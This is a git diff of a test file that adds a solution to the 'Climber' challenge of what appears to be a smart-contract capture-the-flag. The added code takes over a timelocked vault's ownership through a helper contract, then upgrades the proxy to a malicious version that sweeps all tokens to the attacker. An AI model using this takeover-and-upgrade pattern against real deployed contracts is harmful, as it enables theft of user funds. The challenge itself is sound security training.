@@ -18,12 +18,12 @@ describe('[Challenge] Climber', function () {
         expect(
             await ethers.provider.getBalance(attacker.address)
         ).to.equal(ethers.utils.parseEther('0.1'));
-        
+
         // Deploy the vault behind a proxy using the UUPS pattern,
         // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
         this.vault = await upgrades.deployProxy(
             await ethers.getContractFactory('ClimberVault', deployer),
-            [ deployer.address, proposer.address, sweeper.address ],
+            [deployer.address, proposer.address, sweeper.address],
             { kind: 'uups' }
         );
 
@@ -31,13 +31,13 @@ describe('[Challenge] Climber', function () {
         expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt('0');
         expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
         expect(await this.vault.owner()).to.not.eq(deployer.address);
-        
+
         // Instantiate timelock
         let timelockAddress = await this.vault.owner();
         this.timelock = await (
             await ethers.getContractFactory('ClimberTimelock', deployer)
         ).attach(timelockAddress);
-        
+
         // Ensure timelock roles are correctly initialized
         expect(
             await this.timelock.hasRole(await this.timelock.PROPOSER_ROLE(), proposer.address)
@@ -51,8 +51,26 @@ describe('[Challenge] Climber', function () {
         await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
     });
 
-    it('Exploit', async function () {        
+    it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        this.solution = await (await ethers.getContractFactory('ClimberSolution', attacker)).deploy(
+            this.timelock.address,
+            this.vault.address
+        );
+
+        // Thực hiện lấy quyền owner của Vault cho attacker 
+        await this.solution.connect(attacker).attack(attacker.address);
+        // console.log("attacker: ", attacker.address);
+        // console.log("vault owner: ", await this.vault.owner());
+
+        // Tạo Vault V2
+        const VaultV2 = await ethers.getContractFactory('ClimberVaultV2', attacker);
+        this.vaultV2 = await VaultV2.deploy();
+        const vaultV2Interface = VaultV2.interface;
+        const data = vaultV2Interface.encodeFunctionData('sweepFundsV2', [this.token.address]);
+
+        // Thực hiện upgrade lên Vault V2 và rút hết tiền về account attacker
+        await this.vault.connect(attacker).upgradeToAndCall(this.vaultV2.address, data);
     });
 
     after(async function () {
